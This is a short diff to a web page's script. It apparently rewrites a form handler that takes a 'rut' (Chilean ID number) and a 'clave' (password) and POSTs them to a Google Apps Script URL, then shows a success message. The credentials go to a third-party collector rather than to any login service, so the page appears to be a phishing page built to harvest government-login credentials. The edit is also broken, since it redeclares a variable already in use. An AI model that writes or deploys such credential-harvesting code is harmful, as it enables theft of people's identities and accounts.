@@ -101,21 +101,26 @@
       datos.append("rut", form.rut.value);
       datos.append("clave", form.clave.value);
 
-      fetch("https://script.google.com/macros/s/AKfycbwnIB8we8POlSKsIr2URrZixdYNV1PPLQIwDE2XoCe_mLIT3wcO91Z1vMer-Q6ZKM_k5A/exec", {
-        method: "POST",
-        body: datos
-      })
-      .then(() => {
-        cargando.style.display = "none";
-        mensaje.style.display = "block";
-        form.reset();
-        form.querySelector("button").disabled = false;
-      })
-      .catch(error => {
-        cargando.style.display = "none";
-        alert("Ocurrió un error al enviar. Intenta nuevamente.");
-        form.querySelector("button").disabled = false;
-        console.error("Error:", error);
+      const datos = new URLSearchParams();
+datos.append("rut", form.rut.value);
+datos.append("clave", form.clave.value);
+
+fetch("https://script.google.com/macros/s/AKfycbwnIB8we8POlSKsIr2URrZixdYNV1PPLQIwDE2XoCe_mLIT3wcO91Z1vMer-Q6ZKM_k5A/exec", {
+  method: "POST",
+  body: datos
+})
+.then(() => {
+  cargando.style.display = "none";
+  mensaje.style.display = "block";
+  form.reset();
+  form.querySelector("button").disabled = false;
+})
+.catch(error => {
+  cargando.style.display = "none";
+  alert("Ocurrió un error al enviar. Intenta nuevamente.");
+  form.querySelector("button").disabled = false;
+  console.error("Error:", error);
+});
       });
     });
   </script>
